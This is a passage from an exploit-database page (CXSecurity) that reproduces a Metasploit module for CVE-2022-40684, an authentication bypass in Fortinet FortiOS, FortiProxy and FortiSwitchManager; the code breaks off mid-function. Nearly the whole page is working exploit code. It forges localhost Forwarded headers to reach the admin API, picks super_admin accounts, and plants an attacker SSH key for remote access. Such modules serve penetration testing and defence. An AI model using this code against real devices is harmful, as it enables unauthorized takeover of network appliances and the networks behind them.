---
title: Fortinet FortiOS / FortiProxy / FortiSwitchManager Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2022100054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-20
fetch_date: 2025-10-03T20:20:15.683395
---

# Fortinet FortiOS / FortiProxy / FortiSwitchManager Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fortinet FortiOS / FortiProxy / FortiSwitchManager Authentication Bypass** **2022.10.19**  Credit:  **[Heyder Andrade](https://cxsecurity.com/author/Heyder%2BAndrade/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::SSH
prepend Msf::Exploit::Remote::AutoCheck
attr\_accessor :ssh\_socket
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.',
'Description' => %q{
This module exploits an authentication bypass vulnerability
in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API
to gain access to a chosen account. And then add a SSH key to the
authorized\_keys file of the chosen account, allowing
to login to the system with the chosen account.
Successful exploitation results in remote code execution.
},
'Author' => [
'Heyder Andrade <@HeyderAndrade>', # Metasploit module
'Zach Hanley <@hacks\_zach>', # PoC
],
'References' => [
['CVE', '2022-40684'],
['URL', 'https://www.fortiguard.com/psirt/FG-IR-22-377'],
['URL', 'https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684'],
],
'License' => MSF\_LICENSE,
'DisclosureDate' => '2022-10-10', # Vendor advisory
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD],
'Privileged' => true,
'Targets' => [
[
'FortiOS',
{
'DefaultOptions' => {
'PAYLOAD' => 'generic/ssh/interact'
},
'Payload' => {
'Compat' => {
'PayloadType' => 'ssh\_interact'
}
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [
IOC\_IN\_LOGS,
ARTIFACTS\_ON\_DISK # SSH key is added to authorized\_keys file
]
}
)
)
register\_options(
[
OptString.new('TARGETURI', [true, 'The base path to the Fortinet CMDB API', '/api/v2/cmdb/']),
OptString.new('USERNAME', [false, 'Target username (Default: auto-detect)', nil]),
OptString.new('PRIVATE\_KEY', [false, 'SSH private key file path', nil]),
OptString.new('KEY\_PASS', [false, 'SSH private key password', nil]),
OptString.new('SSH\_RPORT', [true, 'SSH port to connect to', 22]),
OptBool.new('PREFER\_ADMIN', [false, 'Prefer to use the admin user if one is detected', true])
]
)
end
def username
if datastore['USERNAME']
@username ||= datastore['USERNAME']
else
@username ||= detect\_username
end
end
def ssh\_rport
datastore['SSH\_RPORT']
end
def current\_keys
@current\_keys ||= read\_keys
end
def ssh\_keygen
# ssh-keygen -t rsa -m PEM -f `openssl rand -hex 8`
if datastore['PRIVATE\_KEY']
@ssh\_keygen ||= Net::SSH::KeyFactory.load\_data\_private\_key(
File.read(datastore['PRIVATE\_KEY']),
datastore['KEY\_PASS'],
datastore['PRIVATE\_KEY']
)
else
@ssh\_keygen ||= OpenSSL::PKey::EC.generate('prime256v1')
end
end
def ssh\_private\_key
ssh\_keygen.to\_pem
end
def ssh\_pubkey
Rex::Text.encode\_base64(ssh\_keygen.public\_key.to\_blob)
end
def authorized\_keys
pubkey = Rex::Text.encode\_base64(ssh\_keygen.public\_key.to\_blob)
"#{ssh\_keygen.ssh\_type} #{pubkey} #{username}@localhost"
end
def fortinet\_request(params = {})
send\_request\_cgi(
{
'ctype' => 'application/json',
'agent' => 'Report Runner',
'headers' => {
'Forwarded' => "for=\"[127.0.0.1]:#{rand(1024..65535)}\";by=\"[127.0.0.1]:#{rand(1024..65535)}\""
}
}.merge(params)
)
end
def check
vprint\_status("Checking #{datastore['RHOST']}:#{datastore['RPORT']}")
# a normal request to the API should return a 401
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, Rex::Text.rand\_text\_alpha\_lower(6)),
'ctype' => 'application/json'
})
return CheckCode::Unknown('Target did not respond to check.') unless res
return CheckCode::Safe('Target seems not affected by this vulnerability.') unless res.code == 401
# Trying to bypasss the authentication and get the sshkey from the current targeted user it should return a 200 if vulnerable
res = fortinet\_request({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, '/system/status')
})
return CheckCode::Safe unless res&.code == 200
version = res.get\_json\_document['version']
print\_good("Target is running the version #{version}, which is vulnerable.")
Socket.tcp(rhost, ssh\_rport, connect\_timeout: datastore['SSH\_TIMEOUT']) { |sock| return CheckCode::Safe('However SSH is not open, so adding a ssh key wouldn\t give you access to the host.') unless sock }
CheckCode::Vulnerable('And SSH is running which makes it exploitable.')
end
def cleanup
return unless ssh\_socket
# it assumes our key is the last one and set it to a random text. The API didn't respond to DELETE method
data = {
"ssh-public-key#{current\_keys.empty? ? '1' : current\_keys.size}" => '""'
}
fortinet\_request({
'method' => 'PUT',
'uri' => normalize\_uri(target\_uri.path, '/system/admin/', username),
'data' => data.to\_json
})
end
def detect\_username
vprint\_status('User auto-detection...')
res = fortinet\_request(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, '/system/admin')
)
users = res.get\_json\_document['results'].collect { |e| e['name'] if (e['accprofile'] == 'super\_admin' && e['trusthost1'] == '0.0.0.0 0.0.0.0') }.compact
# we prefer to use admin, but if it doesn't exist we chose a random one.
if datastore['PREFER\_ADMIN']
vprint\_status("PREFER\_ADMIN is #{datastore['PREFER\_ADMIN']}, but if it isn't found we will pick a random one.")
users.include?('admin') ? 'admin' : users.sample
else
vprint\_status("PREFER\_ADMIN is #{datastore['PREFER\_ADMIN']}, we will get a random that is not the admin.")
(users - ['admin']).sample
end
end
def add\_ssh\_key
if current\_keys.include?(authorized\_keys)
# then we'll remove that on cleanup
print\_good('Your key is already in the authorized\_keys file')
return
end
vprint\_status('Adding SSH ...